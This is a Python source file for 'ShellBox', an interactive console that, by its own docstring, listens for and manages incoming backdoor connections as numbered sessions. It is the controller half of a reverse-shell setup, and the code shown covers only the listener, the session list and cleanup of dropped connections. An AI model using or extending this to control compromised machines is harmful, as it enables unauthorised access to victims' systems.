# -*- coding: utf-8 -*-

"""
The shellbox interactive terminal.
======================

The shellbox emulate an interactive terminal to deploy a remote server to listen to incoming
backdoor connections. With the shellbox you can accept connections and store them on a list,
to help you find the correct connection to interact with. The default limit number of connections
is 5, any other connection attempt will be rejected by the server.

:Example:

>>> from shellbox import ShellBox
>>> intro = '''
...            /$$                 /$$ /$$ /$$
...           | $$                | $$| $$| $$
...   /$$$$$$$| $$$$$$$   /$$$$$$ | $$| $$| $$$$$$$   /$$$$$$  /$$   /$$
...  /$$_____/| $$__  $$ /$$__  $$| $$| $$| $$__  $$ /$$__  $$|  $$ /$$/
... |  $$$$$$ | $$  \ $$| $$$$$$$$| $$| $$| $$  \ $$| $$  \ $$ \  $$$$/
...  \____  $$| $$  | $$| $$_____/| $$| $$| $$  | $$| $$  | $$   gt;$$  $$
...  /$$$$$$$/| $$  | $$|  $$$$$$$| $$| $$| $$$$$$$/|  $$$$$$/ /$$/\  $$
... |_______/ |__/  |__/ \_______/|__/|__/|_______/  \______/ |__/  \__/
... '''
>>> shellbox = Shellbox('shellbox', intro=intro, max_connections=1)
>>> shellbox.cmdloop()

Available commands:
:help: Display a list of the shellbox commands.
:list: List all available sessions(connections), if any.
:listen: Configurate and start a remote server to listen connections.
:exit: Exit the box.
"""

import cmd
import sys
import socket
import utils
from socket_factory import SocketFactory
from socket_api import SocketApi
from threads import Pooler

class ShellBox(cmd.Cmd):
    """The interative command shell box."""
    def __init__(self, prompt, intro=None, max_connections=5):
        """
        Constructor of ShellBox class.

        :param prompt: The shell prompt.
        :param max_connections: The maximum of connections the server accepts.
        :return: The ShellBox object.
        """
        cmd.Cmd.__init__(self)
        self.prompt = utils.yellow(prompt.strip() + '> ')
        self.server_started = False
        self.intro = intro
        self.__socket = None
        self.__sessions = []

        # Create the thread to accept connections every 2 seconds.
        self.connection_acceptor = Pooler(2, self._accept_connection)

        # Create the thread to resolve connections every 5 seconds.
        self.connection_resolver = Pooler(5, self._resolve_connections)

        # Starts the manager.
        self.connection_resolver.start()

    def do_exit(self, *args):
        """Exit from box."""

        # Wait until threads to finish.
        self.connection_acceptor.stop()
        self.connection_resolver.stop()

        # Close all sessions.
        for session in self.__sessions:
            session[0].close()

        if self.__socket:
            # Close the socket connections.
            self.__socket.close()

        return True

    def do_listen(self, *args):
        """Start a server on localhost to listen connections on given port."""
        host = self._input(utils.yellow('[+] Enter the host IP > '))
        port = self._input(utils.yellow('[+] Enter the port > '))

        # Create a socket object from factory to accepts connections.
        self.__socket = SocketFactory.server(listen=host, port=port)

        # Inform user that server has started.
        print(utils.green('[*] Started a remote server on {}:{}'.format(host, port)))

        # Start to accept the incoming connections.
        self.connection_acceptor.start()

        # Set the server has started.
        self.server_started = True

    def do_list(self, *args):
        """List all available sessions."""
        # List with all active hosts.
        hosts = []

        # Length of the bigggest text string[card].
        biggest = None
        for index, connection in enumerate(self.__sessions):
            # Append host card to list.
            hosts.append('{} - {} - {}'.format(index, *connection[1:]))
            if index == 0:
                # The first bigger card.
                biggest = len(hosts[0])
            else:
                if len(hosts[index]) > biggest:
                    # Set the new biggest card.
                    biggest = len(hosts[index])
        else:
            if self.server_started:
                # Any socket has connected the server.
                hosts.append('Any available connections!')
            else:
                # The server has not been started.
                hosts.append('Server still not started. Use "listen" to start a remote server.')
            biggest = len(hosts[0])

        # Print the top stick.
        print(utils.yellow('{}'.format('-' * (biggest + 4))))

        # Print each host.
        for host in hosts:
            print(utils.blue('| {} |'.format(host + ' ' * (biggest - len(host)))))

        # Print the bottom stick.
        print(utils.yellow('{}'.format('-' * (biggest + 4))))

    def _accept_connection(self, *args):
        """Accept an incomming connection."""

        # Set socket timeout.
        self.__socket.settimeout(5)
        try:
            # Try to add a session.
            self._add_session(*self.__socket.accept())
        except (socket.timeout, OSError):
            pass

        # Redefine socket timeout.
        self.__socket.settimeout(None)

    def _resolve_connections(self, *args):
        """Resolves a connection informing the user that the connection was lost."""
        # Iterate into connections.
        for index, session in enumerate(self.__sessions):

            # Verify whether socket connection is alive.
            if not session[0].is_alive():

                # Remove disconnected connection from list.
                del self.__sessions[index]

    def _input(self, message):
        """
        Receive a user input using default buffer.

        :param message: The message.
        """
        # For pythons version 2
        if sys.version_info.major == 2:
            # Displays the message.
            self.stdout.write(message)

            # Read data from STDIN.
            return self.stdin.readline().strip()

        return input(message)

    def _add_session(self, sock, address):
        """
        Append a new session.

        :param sock: The socket object.
        :param address: A tuple with IP and port.
        """
        self.__sessions.append([SocketApi(sock), '{}:{}'.format(*address), 'Connected!'])
